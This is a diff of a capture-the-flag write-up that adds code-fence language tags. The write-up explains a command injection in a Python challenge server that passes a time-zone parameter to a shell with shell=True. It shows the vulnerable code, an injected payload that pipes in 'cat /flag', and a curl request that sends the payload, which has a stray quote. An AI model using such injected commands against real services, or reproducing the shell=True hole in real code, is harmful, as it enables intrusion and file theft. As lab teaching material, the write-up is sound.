@@ -11,7 +11,7 @@ However, this application is **vulnerable to command injection**, due to the use
 
 Let's look at the vulnerable server-side code:
 
-```
+```python
 #!/usr/bin/exec-suid -- /usr/bin/python3 -I
 
 import subprocess
@@ -55,13 +55,13 @@ app.run("challenge.localhost", 80)
 
 The server constructs a shell command like:
 
-```
+```SHELL
 TZ=<user_input> date
 ```
 
 And then executes it using:
 
-```
+```Python
 subprocess.run(command, shell=True, ...)
 ```
 
@@ -82,13 +82,13 @@ If the user injects something like | cat /flag, the shell will execute it as par
 
 ### Payload:
 
-```
+```SHELL
 /flag | cat /flag
 ```
 
 This makes the final shell command:
 
-```
+```SHELL
 TZ=/flag | cat /flag date
 ```
 
@@ -96,23 +96,24 @@ What the Shell Sees:
 
 This breaks into two commands via the `|` (pipe):
 
-```
+```SHELL
 TZ=/flag
 ```
 → Sets an environment variable (mostly harmless)
 
-```
+```SHELL
 cat /flag date
 ```
 
 → This is interpreted as:
 
-```
+```SHELL
 cat /flag date
 ```
 
 ## Final Exploit Command
 
-```
+```SHELL
 curl -v "http://challenge.localhost:80/milestone?time-zone=/flag%20|%20cat%20/flag""
+
 ```
